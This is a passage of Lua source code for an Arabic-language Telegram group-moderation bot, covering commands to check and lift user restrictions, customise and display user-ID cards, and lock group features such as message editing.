if DevaMeR:sismember(LanZo..'aMeR:Tkeed:',result.sender_user_id_) then tkeed = 'مقيد' else tkeed = 'غير مقيد' end
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙الحظر العام ↫ '..banall..'\n᥀︙الكتم العام ↫ '..muteall..'\n᥀︙الحظر ↫ '..banned..'\n᥀︙الكتم ↫ '..muted..'\n᥀︙التقيد ↫ '..tkeed, 1, 'md')  
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),kshf_by_reply) 
end
if text and text:match('^كشف القيود @(.*)') and Admin(msg) and ChCheck(msg) then 
local username = text:match('^كشف القيود @(.*)') 
function kshf_by_username(extra, result, success)
if result.id_ then
if DevaMeR:sismember(LanZo..'aMeR:Muted:'..msg.chat_id_,result.id_) then muted = 'مكتوم' else muted = 'غير مكتوم' end
if DevaMeR:sismember(LanZo..'aMeR:Ban:'..msg.chat_id_,result.id_) then banned = 'محظور' else banned = 'غير محظور' end
if DevaMeR:sismember(LanZo..'aMeR:BanAll:',result.id_) then banall = 'محظور عام' else banall = 'غير محظور عام' end
if DevaMeR:sismember(LanZo..'aMeR:MuteAll:',result.id_) then muteall = 'مكتوم عام' else muteall = 'غير مكتوم عام' end
if DevaMeR:sismember(LanZo..'aMeR:Tkeed:',result.id_) then tkeed = 'مقيد' else tkeed = 'غير مقيد' end
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙الحظر العام ↫ '..banall..'\n᥀︙الكتم العام ↫ '..muteall..'\n᥀︙الحظر ↫ '..banned..'\n᥀︙الكتم ↫ '..muted..'\n᥀︙التقيد ↫ '..tkeed, 1, 'md')  
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')  
end
end
resolve_username(username,kshf_by_username) 
end
if text == 'رفع القيود' and tonumber(msg.reply_to_message_id_) > 0 and Admin(msg) and ChCheck(msg) then 
function unbanreply(extra, result, success) 
if tonumber(result.sender_user_id_) == tonumber(LanZo) then  
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙انا البوت وليس لدي قيود', 1, 'md')  
return false  
end 
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم رفع قيوده") 
if SecondSudo(msg) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevaMeR:srem(LanZo..'aMeR:Tkeed:'..msg.chat_id_,result.sender_user_id_) DevaMeR:srem(LanZo..'aMeR:Ban:'..msg.chat_id_,result.sender_user_id_) DevaMeR:srem(LanZo..'aMeR:Muted:'..msg.chat_id_,result.sender_user_id_) DevaMeR:srem(LanZo..'aMeR:BanAll:',result.sender_user_id_) DevaMeR:srem(LanZo..'aMeR:MuteAll:',result.sender_user_id_)
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevaMeR:srem(LanZo..'aMeR:Tkeed:'..msg.chat_id_,result.sender_user_id_) DevaMeR:srem(LanZo..'aMeR:Ban:'..msg.chat_id_,result.sender_user_id_) DevaMeR:srem(LanZo..'aMeR:Muted:'..msg.chat_id_,result.sender_user_id_) 
end
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),unbanreply) 
end
if text and text:match('^رفع القيود (%d+)') and Admin(msg) and ChCheck(msg) then 
local user = text:match('رفع القيود (%d+)') 
if tonumber(user) == tonumber(LanZo) then  
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙انا البوت وليس لدي قيود', 1, 'md')  
return false  
end 
tdcli_function ({ID = "GetUser",user_id_ = user},function(arg,data) 
if data and data.code_ and data.code_ == 6 then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙لم استطع استخراج المعلومات', 1, 'md') 
return false  
end
ReplyStatus(msg,user,"Reply","᥀︙تم رفع قيوده") 
if SecondSudo(msg) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..user.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevaMeR:srem(LanZo..'aMeR:Tkeed:'..msg.chat_id_,user) DevaMeR:srem(LanZo..'aMeR:Ban:'..msg.chat_id_,user) DevaMeR:srem(LanZo..'aMeR:Muted:'..msg.chat_id_,user) DevaMeR:srem(LanZo..'aMeR:BanAll:',user) DevaMeR:srem(LanZo..'aMeR:MuteAll:',user)
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..user.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevaMeR:srem(LanZo..'aMeR:Tkeed:'..msg.chat_id_,user) DevaMeR:srem(LanZo..'aMeR:Ban:'..msg.chat_id_,user) DevaMeR:srem(LanZo..'aMeR:Muted:'..msg.chat_id_,user) 
end  
end,nil)  
end
if text and text:match('^رفع القيود @(.*)') and Admin(msg) and ChCheck(msg) then  
local username = text:match('رفع القيود @(.*)')  
function unbanusername(extra,result,success)  
if result and result.message_ and result.message_ == "USERNAME_NOT_OCCUPIED" then 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')  
return false  
end
if result and result.type_ and result.type_.channel_ and result.type_.channel_.ID == "Channel" then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙هذا معرف قناة وليس معرف حساب', 1, 'md') 
return false  
end
if tonumber(result.id_) == tonumber(LanZo) then  
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙انا البوت وليس لدي قيود', 1, 'md')  
return false  
end 
tdcli_function ({ID = "GetUser",user_id_ = result.id_},function(arg,data) 
if data and data.code_ and data.code_ == 6 then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙لم استطع استخراج المعلومات', 1, 'md') 
return false  
end
ReplyStatus(msg,result.id_,"Reply","᥀︙تم رفع قيوده") 
if SecondSudo(msg) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevaMeR:srem(LanZo..'aMeR:Tkeed:'..msg.chat_id_,result.id_) DevaMeR:srem(LanZo..'aMeR:Ban:'..msg.chat_id_,result.id_) DevaMeR:srem(LanZo..'aMeR:Muted:'..msg.chat_id_,result.id_) DevaMeR:srem(LanZo..'aMeR:BanAll:',result.id_) DevaMeR:srem(LanZo..'aMeR:MuteAll:',result.id_)
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevaMeR:srem(LanZo..'aMeR:Tkeed:'..msg.chat_id_,result.id_) DevaMeR:srem(LanZo..'aMeR:Ban:'..msg.chat_id_,result.id_) DevaMeR:srem(LanZo..'aMeR:Muted:'..msg.chat_id_,result.id_) 
end
end,nil)   
end  
resolve_username(username,unbanusername) 
end 
--     Source LanZo     --
if Manager(msg) then
if text and text:match("^تغيير الايدي$") and ChCheck(msg) or text and text:match("^تغير الايدي$") and ChCheck(msg) then 
local List = {
[[
゠𝚄𝚂𝙴𝚁 𖨈 #username 𖥲 .
゠𝙼𝚂𝙶 𖨈 #msgs 𖥲 .
゠𝚂𝚃𝙰 𖨈 #stast 𖥲 .
゠𝙸𝙳 𖨈 #id 𖥲 .
]],
[[
➭- 𝒔𝒕𝒂𓂅 #stast 𓍯. 💕
➮- 𝒖𝒔𝒆𝒓𓂅 #username 𓍯. 💕
➭- 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯. 💕
➭- 𝒊𝒅 𓂅 #id 𓍯. 💕
]],
[[
⚕ 𓆰 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𝑻𝒐 𝑮𝒓𝒐𝒖𝒑 ★
• 🖤 | 𝑼𝑬𝑺 : #username ‌‌‏⚚
• 🖤 | 𝑺𝑻𝑨 : #stast 🧙🏻‍♂️ ☥
• 🖤 | 𝑰𝑫 : #id ‌‌‏♕
• 🖤 | 𝑴𝑺𝑮 : #msgs 𓆊
]],
[[
┌ 𝐔𝐒𝐄𝐑 𖤱 #username 𖦴 .
├ 𝐌𝐒𝐆 𖤱 #msgs 𖦴 .
├ 𝐒𝐓𝐀 𖤱 #stast 𖦴 .
└ 𝐈𝐃 𖤱 #id 𖦴 .
]],
[[
𓄼🇮🇶 𝑼𝒔𝒆𝒓𝑵𝒂𝒎𝒆 : #username 
𓄼🇮🇶 𝑺𝒕𝒂𝒔𝒕 : #stast 
𓄼🇮🇶 𝒊𝒅 : #id 
𓄼🇮🇶 𝑮𝒂𝒎𝒆𝑺 : #game 
𓄼🇮🇶 𝑴𝒔𝒈𝒔 : #msgs
]],
[[
➞: 𝒔𝒕𝒂𓂅 #stast 𓍯➸💞.
➞: 𝒖𝒔𝒆𝒓𓂅 #username 𓍯➸💞.
➞: 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯➸💞.
➞: 𝒊𝒅 𓂅 #id 𓍯➸💞.
]],
[[
☆•𝐮𝐬𝐞𝐫 : #username 𖣬  
☆•𝐦𝐬𝐠  : #msgs 𖣬 
☆•𝐬𝐭𝐚 : #stast 𖣬 
☆•𝐢𝐝  : #id 𖣬
]],
[[
- 𓏬 𝐔𝐬𝐄𝐫 : #username 𓂅 .
- 𓏬 𝐌𝐬𝐆  : #msgs 𓂅 .
- 𓏬 𝐒𝐭𝐀 : #stast 𓂅 .
- 𓏬 𝐈𝐃 : #id 𓂅 .
]],
[[
.𖣂 𝙪𝙨𝙚𝙧𝙣𝙖𝙢𝙚 , #username  
.𖣂 𝙨𝙩𝙖𝙨𝙩 , #stast  
.𖣂 𝙡𝘿 , #id  
.𖣂 𝙂𝙖𝙢𝙨 , #game 
.𖣂 𝙢𝙨𝙂𝙨 , #msgs
]],
[[
᥀︙𝐔𝐒𝐄𝐑 ↬ #username 
᥀︙𝐈𝐃 ↬ #id
᥀︙𝐒𝐓𝐀𝐒𝐓 ↬ #stast
᥀︙𝐀𝐔𝐓𝐎 ↬ #cont 
᥀︙𝐌𝐀𝐒𝐆 ↬ #msgs
᥀︙𝐆𝐀𝐌𝐄 ↬ #game
]],
[[
ᯓ 𝗨𝗦𝗘𝗥𝗡𝗮𝗺𝗘 . #username 🇺🇸 ꙰
ᯓ 𝗦𝗧𝗮𝗦𝗧 . #stast 🇺🇸 ꙰
ᯓ 𝗜𝗗 . #id 🇺🇸 ꙰
ᯓ 𝗚𝗮𝗺𝗘𝗦 . #game 🇺🇸 ꙰
ᯓ 𝗺𝗦𝗚𝗦 . #msgs 🇺🇸 ꙰
]],
[[
- ᴜѕᴇʀɴᴀᴍᴇ ➥• #username .
- ᴍѕɢѕ ➥• #msgs .
- ѕᴛᴀᴛѕ ➥• #stast .
- ʏᴏᴜʀ ɪᴅ ➥• #id  .
- ᴇᴅɪᴛ ᴍsɢ ➥• #edit .
- ᴅᴇᴛᴀɪʟs ➥• #auto . 
- ɢᴀᴍᴇ ➥• #game .
]]}
local Text_Rand = List[math.random(#List)]
DevaMeR:set(LanZo.."aMeR:GpIds:Text"..msg.chat_id_,Text_Rand)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم تغير كليشة الايدي")  
end
--     Source LanZo     --
if SecondSudo(msg) then
if text and text:match("^تعيين الايدي العام$") or text and text:match("^تعين الايدي العام$") or text and text:match("^تعيين كليشة الايدي$") then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙رجائا اتبع التعليمات للتعيين \n᥀︙لطبع كليشة الايدي ارسل كليشه تحتوي على النصوص التي باللغه الانجليزيه ادناه ↫ ⤈\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n `#username` ↬ لطبع المعرف\n `#id` ↬ لطبع الايدي \n `#photos` ↬ لطبع عدد الصور \n `#stast` ↬ لطبع الرتب \n `#msgs` ↬ لطبع عدد الرسائل \n `#msgday` ↬ لطبع الرسائل اليوميه \n `#CustomTitle` ↬ لطبع اللقب \n `#bio` ↬ لطبع البايو \n `#auto` ↬ لطبع التفاعل \n `#game` ↬ لطبع عدد النقاط \n `#cont` ↬ لطبع عدد الجهات \n `#edit` ↬ لطبع عدد السحكات \n `#Description` ↬ لطبع تعليق الصور\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉', 1, 'md')
DevaMeR:set("LanZo:New:id:"..LanZo..msg.sender_user_id_,'LanZoTeam')
return "LanZoTeam"
end
if text and DevaMeR:get("LanZo:New:id:"..LanZo..msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء حفظ كليشة الايدي', 1, 'md')
DevaMeR:del("LanZo:New:id:"..LanZo..msg.sender_user_id_)
return false
end
DevaMeR:del("LanZo:New:id:"..LanZo..msg.sender_user_id_)
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙تم حفظ كليشة الايدي العامه', 1, 'md')
DevaMeR:set(LanZo.."aMeR:AllIds:Text",text)
return false
end
if text and text:match("^حذف الايدي العام$") or text and text:match("^مسح الايدي العام$") or text and text:match("^حذف كليشة الايدي$") and ChCheck(msg) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف كليشة الايدي العامه")  
DevaMeR:del(LanZo.."aMeR:AllIds:Text")
end
end
--     Source LanZo     --
if text and text:match("^تعيين الايدي$") and ChCheck(msg) or text and text:match("^تعين الايدي$") and ChCheck(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙رجائا اتبع التعليمات للتعيين \n᥀︙لطبع كليشة الايدي ارسل كليشه تحتوي على النصوص التي باللغه الانجليزيه ادناه ↫ ⤈\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n `#username` ↬ لطبع المعرف\n `#id` ↬ لطبع الايدي \n `#photos` ↬ لطبع عدد الصور \n `#stast` ↬ لطبع الرتب \n `#msgs` ↬ لطبع عدد الرسائل \n `#msgday` ↬ لطبع الرسائل اليوميه \n `#CustomTitle` ↬ لطبع اللقب \n `#bio` ↬ لطبع البايو \n `#auto` ↬ لطبع التفاعل \n `#game` ↬ لطبع عدد النقاط \n `#cont` ↬ لطبع عدد الجهات \n `#edit` ↬ لطبع عدد السحكات \n `#Description` ↬ لطبع تعليق الصور\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉', 1, 'md')
DevaMeR:set("LanZo:New:id:"..LanZo..msg.chat_id_..msg.sender_user_id_,'LanZoTeam')
return "LanZoTeam"
end
if text and Manager(msg) and DevaMeR:get("LanZo:New:id:"..LanZo..msg.chat_id_..msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء حفظ كليشة الايدي', 1, 'md')
DevaMeR:del("LanZo:New:id:"..LanZo..msg.chat_id_..msg.sender_user_id_)
return false
end
DevaMeR:del("LanZo:New:id:"..LanZo..msg.chat_id_..msg.sender_user_id_)
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙تم حفظ الكليشه الجديده', 1, 'md')
DevaMeR:set(LanZo.."aMeR:GpIds:Text"..msg.chat_id_,text)
return false
end
if text and text:match("^حذف الايدي$") and ChCheck(msg) or text and text:match("^مسح الايدي$") and ChCheck(msg) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف كليشة الايدي")  
DevaMeR:del(LanZo.."aMeR:GpIds:Text"..msg.chat_id_)
end
end
--     Source LanZo     --
if msg.reply_to_message_id_ ~= 0 then
return ""
else
if text and (text:match("^ايدي$") or text:match("^id$") or text:match("^Id$")) and ChCheck(msg) then
function LanZoTeam(extra,aMeR,success)
if aMeR.username_ then username = '@'..aMeR.username_ else username = 'لا يوجد' end
if GetCustomTitle(msg.sender_user_id_,msg.chat_id_) ~= false then CustomTitle = GetCustomTitle(msg.sender_user_id_,msg.chat_id_) else CustomTitle = 'لا يوجد' end
local function getpro(extra, aMeR, success) 
local msgsday = DevaMeR:get(LanZo..'aMeR:UsersMsgs'..LanZo..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local edit_msg = DevaMeR:get(LanZo..'aMeR:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = DevaMeR:get(LanZo..'aMeR:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local user_nkt = tonumber(DevaMeR:get(LanZo..'aMeR:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)
local cont = (tonumber(DevaMeR:get(LanZo..'aMeR:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
local msguser = tonumber(DevaMeR:get(LanZo..'aMeR:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_))
local Texting = {"مو صوره ظيم بالنبي ،🤤💞","مقتنع بصورتك !؟ 😹🖤","ملاك وناسيك بكروبنه ،🤤💞","وفالله ،🤤💞","كشخه برب ،😉🤍","لزكت بيها دغيرها عاد ،😒😕","صورتك مامرتاحلها ،🙄😶","حلغوم والله ،🥺💘","مو صوره غنبله براسها ٦٠ حظ ،😹🤍"}
local Description = Texting[math.random(#Texting)]
if aMeR.photos_[0] then
if not DevaMeR:get(LanZo..'aMeR:Lock:Id'..msg.chat_id_) then 
if not DevaMeR:get(LanZo..'aMeR:Lock:Id:Photo'..msg.chat_id_) then 
if DevaMeR:get(LanZo.."aMeR:AllIds:Text") then
newpicid = DevaMeR:get(LanZo.."aMeR:AllIds:Text")
newpicid = newpicid:gsub('#username',(username or 'لا يوجد'))
newpicid = newpicid:gsub('#CustomTitle',(CustomTitle or 'لا يوجد'))
newpicid = newpicid:gsub('#bio',(GetBio(msg.sender_user_id_) or 'لا يوجد'))
newpicid = newpicid:gsub('#photos',(aMeR.total_count_ or 'لا يوجد')) 
newpicid = newpicid:gsub('#game',(user_nkt or 'لا يوجد'))
newpicid = newpicid:gsub('#edit',(edit_msg or 'لا يوجد'))
newpicid = newpicid:gsub('#cont',(cont or 'لا يوجد'))
newpicid = newpicid:gsub('#msgs',(user_msgs or 'لا يوجد'))
newpicid = newpicid:gsub('#msgday',(msgsday or 'لا يوجد'))
newpicid = newpicid:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
newpicid = newpicid:gsub('#auto',(formsgs(msguser) or 'لا يوجد'))
newpicid = newpicid:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
newpicid = newpicid:gsub('#Description',(Description or 'لا يوجد'))
else
newpicid = "᥀︙"..Description.."\n᥀︙معرفك ↫ ❨ "..username.." ❩\n᥀︙ايديك ↫ ❨ "..msg.sender_user_id_.." ❩\n᥀︙رتبتك ↫ "..IdRank(msg.sender_user_id_, msg.chat_id_).."\n᥀︙رسائلك ↫ ❨ "..user_msgs.." ❩\n᥀︙سحكاتك ↫ ❨ "..edit_msg.." ❩\n᥀︙تفاعلك ↫ "..formsgs(msguser).."\n᥀︙نقاطك ↫ ❨ "..user_nkt.." ❩\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
end 
if not DevaMeR:get(LanZo.."aMeR:GpIds:Text"..msg.chat_id_) then 
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, aMeR.photos_[0].sizes_[1].photo_.persistent_id_,newpicid,msg.id_,msg.id_.."")
else 
local new_id = DevaMeR:get(LanZo.."aMeR:GpIds:Text"..msg.chat_id_)
local new_id = new_id:gsub('#username',(username or 'لا يوجد'))
local new_id = new_id:gsub('#CustomTitle',(CustomTitle or 'لا يوجد'))
local new_id = new_id:gsub('#bio',(GetBio(msg.sender_user_id_) or 'لا يوجد'))
local new_id = new_id:gsub('#photos',(aMeR.total_count_ or '')) 
local new_id = new_id:gsub('#game',(user_nkt or 'لا يوجد'))
local new_id = new_id:gsub('#edit',(edit_msg or 'لا يوجد'))
local new_id = new_id:gsub('#cont',(cont or 'لا يوجد'))
local new_id = new_id:gsub('#msgs',(user_msgs or 'لا يوجد'))
local new_id = new_id:gsub('#msgday',(msgsday or 'لا يوجد'))
local new_id = new_id:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
local new_id = new_id:gsub('#auto',(formsgs(msguser) or 'لا يوجد'))
local new_id = new_id:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
local new_id = new_id:gsub('#Description',(Description or 'لا يوجد'))
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, aMeR.photos_[0].sizes_[1].photo_.persistent_id_,new_id,msg.id_,msg.id_.."")
end
else
if DevaMeR:get(LanZo.."aMeR:AllIds:Text") then
newallid = DevaMeR:get(LanZo.."aMeR:AllIds:Text")
newallid = newallid:gsub('#username',(username or 'لا يوجد'))
newallid = newallid:gsub('#CustomTitle',(CustomTitle or 'لا يوجد'))
newallid = newallid:gsub('#bio',(GetBio(msg.sender_user_id_) or 'لا يوجد'))
newallid = newallid:gsub('#photos',(aMeR.total_count_ or 'لا يوجد')) 
newallid = newallid:gsub('#game',(user_nkt or 'لا يوجد'))
newallid = newallid:gsub('#edit',(edit_msg or 'لا يوجد'))
newallid = newallid:gsub('#cont',(cont or 'لا يوجد'))
newallid = newallid:gsub('#msgs',(user_msgs or 'لا يوجد'))
newallid = newallid:gsub('#msgday',(msgsday or 'لا يوجد'))
newallid = newallid:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
newallid = newallid:gsub('#auto',(formsgs(msguser) or 'لا يوجد'))
newallid = newallid:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
newallid = newallid:gsub('#Description',(Description or 'لا يوجد'))
else
newallid = "᥀︙معرفك ↫ ❨ "..username.." ❩\n᥀︙ايديك ↫ ❨ "..msg.sender_user_id_.." ❩\n᥀︙رتبتك ↫ "..IdRank(msg.sender_user_id_, msg.chat_id_).."\n᥀︙رسائلك ↫ ❨ "..user_msgs.." ❩\n᥀︙سحكاتك ↫ ❨ "..edit_msg.." ❩\n᥀︙تفاعلك ↫ "..formsgs(msguser).."\n᥀︙نقاطك ↫ ❨ "..user_nkt.." ❩"
end 
if not DevaMeR:get(LanZo.."aMeR:GpIds:Text"..msg.chat_id_) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, newallid, 1, 'html')
else
local new_id = DevaMeR:get(LanZo.."aMeR:GpIds:Text"..msg.chat_id_)
local new_id = new_id:gsub('#username',(username or 'لا يوجد'))
local new_id = new_id:gsub('#CustomTitle',(CustomTitle or 'لا يوجد'))
local new_id = new_id:gsub('#bio',(GetBio(msg.sender_user_id_) or 'لا يوجد'))
local new_id = new_id:gsub('#photos',(aMeR.total_count_ or 'لا يوجد')) 
local new_id = new_id:gsub('#game',(user_nkt or 'لا يوجد'))
local new_id = new_id:gsub('#edit',(edit_msg or 'لا يوجد'))
local new_id = new_id:gsub('#cont',(cont or 'لا يوجد'))
local new_id = new_id:gsub('#msgs',(user_msgs or 'لا يوجد'))
local new_id = new_id:gsub('#msgday',(msgsday or 'لا يوجد'))
local new_id = new_id:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
local new_id = new_id:gsub('#auto',(formsgs(msguser) or 'لا يوجد'))
local new_id = new_id:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
local new_id = new_id:gsub('#Description',(Description or 'لا يوجد'))
Dev_aMeR(msg.chat_id_, msg.id_, 1, new_id, 1, 'html')  
end
end
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙عذرا الايدي معطل ', 1, 'md')
end
else
if DevaMeR:get(LanZo.."aMeR:AllIds:Text") then
notpicid = DevaMeR:get(LanZo.."aMeR:AllIds:Text")
notpicid = notpicid:gsub('#username',(username or 'لا يوجد'))
notpicid = notpicid:gsub('#CustomTitle',(CustomTitle or 'لا يوجد'))
notpicid = notpicid:gsub('#bio',(GetBio(msg.sender_user_id_) or 'لا يوجد'))
notpicid = notpicid:gsub('#photos',(aMeR.total_count_ or 'لا يوجد')) 
notpicid = notpicid:gsub('#game',(user_nkt or 'لا يوجد'))
notpicid = notpicid:gsub('#edit',(edit_msg or 'لا يوجد'))
notpicid = notpicid:gsub('#cont',(cont or 'لا يوجد'))
notpicid = notpicid:gsub('#msgs',(user_msgs or 'لا يوجد'))
notpicid = notpicid:gsub('#msgday',(msgsday or 'لا يوجد'))
notpicid = notpicid:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
notpicid = notpicid:gsub('#auto',(formsgs(msguser) or 'لا يوجد'))
notpicid = notpicid:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
notpicid = notpicid:gsub('#Description',(Description or 'لا يوجد'))
else
notpicid = "᥀︙لا استطيع عرض صورتك لانك قمت بحظر البوت او انك لاتمتلك صوره في بروفايلك\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙معرفك ↫ ❨ "..username.." ❩\n᥀︙ايديك ↫ ❨ "..msg.sender_user_id_.." ❩\n᥀︙رتبتك ↫ "..IdRank(msg.sender_user_id_, msg.chat_id_).."\n᥀︙رسائلك ↫ ❨ "..user_msgs.." ❩\n᥀︙سحكاتك ↫ ❨ "..edit_msg.." ❩\n᥀︙تفاعلك ↫ "..formsgs(msguser).."\n᥀︙نقاطك ↫ ❨ "..user_nkt.." ❩\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
end 
if not DevaMeR:get(LanZo..'aMeR:Lock:Id'..msg.chat_id_) then
if not DevaMeR:get(LanZo..'aMeR:Lock:Id:Photo'..msg.chat_id_) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, notpicid, 1, 'html')
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙معرفك ↫ ❨ "..username.." ❩\n᥀︙ايديك ↫ ❨ "..msg.sender_user_id_.." ❩\n᥀︙رتبتك ↫ "..IdRank(msg.sender_user_id_, msg.chat_id_).."\n᥀︙رسائلك ↫ ❨ "..user_msgs.." ❩\n᥀︙سحكاتك ↫ ❨ "..edit_msg.." ❩\n᥀︙رسائلك ↫ ❨ "..user_msgs.." ❩\n᥀︙تفاعلك ↫ "..formsgs(msguser).."\n᥀︙نقاطك ↫ ❨ "..user_nkt.." ❩", 1, 'md')
end
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙عذرا الايدي معطل', 1, 'md')
end end end
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = msg.sender_user_id_, offset_ = 0, limit_ = 1 }, getpro, nil)
end
getUser(msg.sender_user_id_, LanZoTeam)
end
end 
--     Source LanZo     --
if ChatType == 'sp' or ChatType == 'gp'  then
if Admin(msg) then
if text and text:match("^قفل (.*)$") and ChCheck(msg) then
local LockText = {string.match(text, "^(قفل) (.*)$")}
if LockText[2] == "التعديل" then
if not DevaMeR:get(LanZo..'aMeR:Lock:EditMsgs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل التعديل")  
DevaMeR:set(LanZo..'aMeR:Lock:EditMsgs'..msg.chat_id_,true)
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙التعديل بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "التعديل الميديا" or LockText[2] == "تعديل الميديا" then
if not DevaMeR:get(LanZo..'aMeR:Lock:EditMsgs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل تعديل الميديا")  
DevaMeR:set(LanZo..'aMeR:Lock:EditMsgs'..msg.chat_id_,true)
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙تعديل الميديا بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "الفارسيه" then
if not DevaMeR:get(LanZo..'aMeR:Lock:Farsi'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل الفارسيه")  
DevaMeR:set(LanZo..'aMeR:Lock:Farsi'..msg.chat_id_,true)
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙الفارسيه بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الفشار" then
if DevaMeR:get(LanZo..'aMeR:Lock:Fshar'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل الفشار")  
DevaMeR:del(LanZo..'aMeR:Lock:Fshar'..msg.chat_id_)
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙الفشار بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "الطائفيه" then
if DevaMeR:get(LanZo..'aMeR:Lock:Taf'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل الطائفيه")  
DevaMeR:del(LanZo..'aMeR:Lock:Taf'..msg.chat_id_)
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙الطائفيه بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الكفر" then
if DevaMeR:get(LanZo..'aMeR:Lock:Kfr'..msg.chat_id_) then
